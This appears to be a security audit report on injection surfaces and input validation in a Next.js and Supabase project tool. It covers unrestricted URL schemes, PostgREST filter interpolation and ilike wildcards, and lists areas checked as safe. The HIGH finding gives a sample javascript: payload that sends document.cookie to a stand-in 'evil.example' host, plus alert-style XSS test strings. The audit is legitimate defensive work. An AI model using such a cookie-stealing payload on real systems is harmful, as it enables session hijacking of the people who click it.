# F — Injection Surfaces & Input Validation Audit

Scope: Supabase/PostgREST filter injection, raw SQL, zod validation coverage, XSS sinks,
open redirects, number/enum tampering. Codebase: Next.js 16 + Supabase, zod v4.

Date: 2026-07-29

---

## Findings

### HIGH — Project link URLs accept `javascript:`/`data:` schemes and render as a raw clickable `href`

**Files:**
- `src/lib/validation/project.ts:256` — `url: z.url("Enter a valid URL").max(2000)` (no protocol restriction)
- `src/app/(app)/projects/[id]/links/links-list.tsx:45-53` — renders it directly: `<a href={link.url} target="_blank" rel="noreferrer">`
- Write path: `src/app/actions/project-links.ts:12-51` (`upsertLinkAction`, gated only by `manage_links`)

**Exploit:** `manage_links` is an `own_projects`-scoped permission held by every `project_manager`
on their own projects (`supabase/migrations/20260715000002_permission_model.sql:92`, confirmed via
`docs/schema.md:113`). Any PM can create a project link with `url = "javascript:fetch('https://evil.example/steal?c='+document.cookie)"`
(or `javascript:` code that calls a server action / reads page state) and `name = "Prod DB dashboard"`.
`zod`'s `z.url()` accepts this — verified locally:
```
z.url().safeParse('javascript:alert(1)')  -> { success: true }
z.url().safeParse('data:text/html,<script>alert(1)</script>') -> { success: true }
```
The value is written unmodified to `project_links.url` and later rendered as `<a href={link.url}>`
on the project's Links tab, visible to every project member/PM/admin who holds `view_links`.
When any of them clicks the link, the browser executes the `javascript:` URI in the current page's
origin/session (an internal PM tool with credential-reveal and admin flows in the same origin —
`target="_blank"`/`rel="noreferrer"` mitigate `window.opener` tab-nabbing but do **not** block
`javascript:` scheme execution). This is a stored-XSS-via-click primitive that lets a lower-privileged
PM run script in a higher-privileged viewer's (e.g. admin's) session.

**Fix:** Restrict the scheme at validation time, e.g.
```ts
url: z.url({ protocol: /^https?$/ }, "Enter a valid URL").max(2000)
```
(same fix for `credentialSchema`'s `related_url`, see MEDIUM finding below). Optionally also
belt-and-suspenders at render time (reject non-`http(s)` before setting `href`).

---

### MEDIUM — Credential `related_url` has the same unrestricted-scheme gap (currently dormant)

**File:** `src/lib/validation/project.ts:279-285` (`nullableUrl`, used by `credentialSchema.related_url`
and `credentialUpdateSchema`).

Same `z.url()` gap as above. Verified this field is **not** currently rendered as an `href`/`window.open`
anywhere (`src/app/(app)/projects/[id]/credentials/*`, `src/app/(app)/credentials/*` only render it
inside a plain text `<Input>` via `CredentialTextField`) — so there is no live XSS sink today. Flagged
MEDIUM rather than HIGH purely because it's not currently reachable; it is a stored-input validation
gap that becomes a live HIGH the moment anyone adds a "visit related URL" link/button, which is a
natural, easy-to-miss feature addition. Fix with the same `z.url({ protocol: /^https?$/ })` restriction
now, before that happens.

---

### LOW — `.or()` filter strings built from route-param ids rely on implicit UUID-coercion, not explicit whitelisting

**Files:**
- `src/app/(app)/clients/[id]/page.tsx:91-98` — `idList = projectIds.join(",")`; `id` (route param) interpolated into `.or(\`and(resource_type.eq.client,resource_id.eq.${id}),resource_id.in.(${idList}),metadata->>project_id.in.(${idList})\`)`
- `src/app/(app)/people/[id]/page.tsx:120-125,143` — `auditFilter` built with the route-param `id` interpolated into `resource_id.eq.${id}` / `metadata->>person_id.eq.${id}`, then `.or(auditFilter)`

**Why it's not exploitable today:** in both files, `id` only survives to reach the `.or()` call if it
already passed an earlier `.eq("id", id)` lookup (`clients` / `person_workload_rows`) that returned a
real row — `maybeSingle()` + `notFound()` on a miss. Postgres rejects a syntactically invalid UUID
literal compared against a `uuid` column with an error (not a false/empty match), so `id` is
guaranteed to be a well-formed UUID matching a real row (i.e., free of the commas/parens/dots that
would let it break out of the `.or()` predicate) by the time it's interpolated. This differs from the
Activity page's project filter (`src/app/(app)/activity/page.tsx:71,92`), which explicitly whitelists
`params.project` against the known project list before use — the safety here is a side effect of an
unrelated type-coercion failure, not a designed control, and would silently break (reopening the
injection) if the lookup were ever changed to `.ilike()`, a text column, or `.maybeSingle()` were
swapped for something that tolerates malformed input.

**Fix (defense in depth, low priority):** validate the route param with `z.uuid().safeParse(id).success`
(→ `notFound()` on failure) at the top of both pages, mirroring the explicit whitelist pattern already
used in `activity/page.tsx:71`, rather than relying on the incidental DB error path.

---

### LOW — Projects-list search term strips PostgREST metacharacters but not ilike wildcards

**File:** `src/app/(app)/projects/page.tsx:67-70`
```ts
const term = params.q.replace(/[,()*\\]/g, " ").trim();
if (term) query = query.or(`name.ilike.%${term}%,client_name.ilike.%${term}%`);
```
Stripping `,()*\\` correctly prevents breaking out of the `.or()` predicate (no new conditions, no
grouping). However, unlike `src/lib/search.ts`'s `escapeIlike()` (used consistently by the global
header search in `src/app/actions/search.ts:37`), `%` and `_` are not backslash-escaped here, so a
user can type `%` to widen the match to "contains anything" or `_` as a single-char wildcard. This is
**not a privilege escalation** — RLS still scopes `project_list_rows` to what the caller may see — just
an inconsistency with the escaping convention used elsewhere and a minor UX/DoS-adjacent nit (a `%%%%`
query forces a full unfiltered `ilike` scan). Recommend routing through `escapeIlike()` here too for
consistency, after the metacharacter strip.

---

## Verified Safe

- **Global search (`src/lib/search.ts` + `src/app/actions/search.ts`):** `escapeIlike()` (escapes `\`, `%`, `_`, backslash-first to avoid double-escaping) is applied to the trimmed query exactly once, and the resulting pattern is reused for all four `.ilike()` calls (projects, clients, people, client_contacts) — no unescaped path found.
- **Activity log project filter (`src/app/(app)/activity/page.tsx:69-92`):** `validProjectId` is explicitly checked against the server-fetched list of real project ids (`projects.some(p => p.id === params.project)`) before being interpolated into the `.or()` string — a non-whitelisted value never reaches the filter. `validFrom`/`validTo` are regex-anchored (`/^\d{4}-\d{2}-\d{2}$/`) before use.
- **Workload page date window (`src/app/(app)/workload/page.tsx:27-29`, `src/lib/workload.ts:73-86`, `src/lib/workload-timeline.ts:47-59`):** the `?from=` query param is only ever fed through `new Date()`; if parsing fails it's discarded (defaults to "now"). The value actually interpolated into `.or(\`end_date.is.null,end_date.gte.${windowStart}\`)` and `.lte("start_date", windowEnd)` is always a freshly-formatted `YYYY-MM-DD` string produced by `toISOString().slice(0,10)` — the raw query string itself never reaches a filter.
- **`people/page.tsx`'s `.or(\`end_date.is.null,end_date.gte.${today}\`)`** — `today` is computed server-side (`new Date().toISOString().slice(0,10)`), never user input.
- **Raw SQL / migrations (`supabase/migrations/*.sql`):** grepped every `EXECUTE` occurrence — all are `CREATE TRIGGER ... EXECUTE FUNCTION <static_name>()`, i.e. static function references, not dynamic `EXECUTE '...'` string SQL. No `format()`-built dynamic SQL found. `reveal_credential_secret`, `set_user_role`, `create_delegation`, `admin_revoke_user_sessions`, `has_permission`, etc. are all parameterized plpgsql with no string concatenation into query text.
- **`supabase.rpc(...)` call sites** (`credential-reveal.ts`, `admin.ts`, `delegations.ts`, `time-entries.ts`, `project-parts.ts`, `sessions.ts`, `people.ts`, and every `has_permission` check): every argument is either a `z.uuid()`-checked id, a value already validated by a zod schema, or a server-derived value (e.g. `current_person_id()`'s own return value) — no case found where unvalidated free text reaches an RPC argument that could influence dynamic SQL (and the RPC bodies themselves don't build dynamic SQL regardless, per above).
- **Zod coverage across `src/lib/validation/*` and every `src/app/actions/*.ts` server action:** every action that writes to the DB calls `.safeParse()` on a dedicated schema before use (checked all 16 action files). Patterns confirmed: ids are `z.uuid()`; enums are `z.enum([...])` against DB-mirrored option lists (with source comments cross-referencing the exact migration that defines the DB enum); money/hour amounts are bounded (`z.number().min(0).max(10_000_000)`, hours `gt(0).lte(744)`, allocation `progress` clamped `int().min(0).max(100)`); free text is `.max(n)`-capped and blank-collapsed to `null`; dates are regex-anchored `YYYY-MM-DD` or ordering-`refine`d (e.g. `ends_at > starts_at`). No `.passthrough()`, no `z.any()`, no raw client-shaped object spread into an `.insert()`/`.update()` without going through `parsed.data` first (grepped the whole `src` tree for both). Numeric ids reaching non-uuid tables (`entryId`, `itemId`, `memberId`, `updateId`) are checked with `z.number().int().positive()` or `Number.isInteger(x) && x > 0` before use.
- **Number/enum query-param tampering:** `reports?months=` is whitelisted against `PERIOD_OPTIONS` (`src/app/(app)/reports/page.tsx:49-53`, falls back to `6`); `dashboard?finMonth=` is whitelisted against `FIN_MONTH_OPTIONS` (`src/app/(app)/dashboard/page.tsx:54-56`); `activity?page=` is clamped with `Math.max(1, ...)` (`src/app/(app)/activity/page.tsx:75`); `projects?status=`/`?budget_type=` are matched against the const option arrays, not passed through raw (`src/app/(app)/projects/page.tsx:59-60`).
- **XSS/`dangerouslySetInnerHTML`:** zero occurrences in `src/`. No markdown renderer in the codebase.
- **`href`/`src` built from user input:** audited every `href={...}` template literal in `src/` (48 sites). All are one of: (a) app-internal routes built from DB-fetched UUIDs (`/projects/${id}`, `/people/${id}`, etc. — not attacker-controlled strings, and even if they were, React escapes JSX attribute interpolation so no markup injection is possible, only navigation), (b) `mailto:${contact.email}` / `tel:${contact.phone}` (`src/app/(app)/clients/[id]/page.tsx:378,387`) — the scheme prefix is a hardcoded literal, so even a malicious `phone`/`email` value can only produce an invalid/malformed `mailto:`/`tel:` URI, never a `javascript:` URI (browsers require the string to *start* with `javascript:` to treat it as script), or (c) whitelisted enum-driven query strings (`?months=`, `?finMonth=`, `?from=`) covered above. The one real gap is `link.url` (project links), covered in the HIGH finding above.
- **Redirects:** every `redirect()`/`NextResponse.redirect()`/`router.push()` target is either a hardcoded literal (`/dashboard`, `/login`, `/pending`, `/projects`), a same-origin path built from a DB-fetched id, or (`src/app/actions/auth.ts:74`) `redirect(data.url)` from Supabase's own OAuth `signInWithOAuth` response — not user-controlled. No open-redirect pattern found.
